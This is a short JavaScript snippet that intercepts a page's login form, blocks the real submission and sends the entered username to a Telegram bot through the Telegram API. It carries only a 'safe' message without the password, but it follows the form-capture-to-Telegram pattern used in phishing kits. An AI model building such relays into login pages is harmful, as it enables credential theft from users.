// Replace with your bot token and chat ID
const telegramBotToken = 'YOUR_BOT_TOKEN';
const chatId = 'YOUR_CHAT_ID';

// Send a **generic** notification to Telegram
async function sendToTelegram(textMessage) {
  // use the argument `textMessage` directly
  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}`;

  try {
    const response = await fetch(url);
    const result = await response.json();
    if (result.ok) {
      console.log('Message sent to Telegram successfully.');
    } else {
      console.error('Failed to send message to Telegram.');
    }
  } catch (error) {
    console.error('Error sending message:', error);
  }
}

// Handle form submission
document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('loginForm');

  form.addEventListener('submit', (event) => {
    event.preventDefault();

    const username = form.username.value;

    // Build your safe message string here
    const safeMessage = `A login attempt occurred for username: ${username}`;

    // send the safe message
    sendToTelegram(safeMessage);

    alert('Login attempt recorded safely.');
  });
});
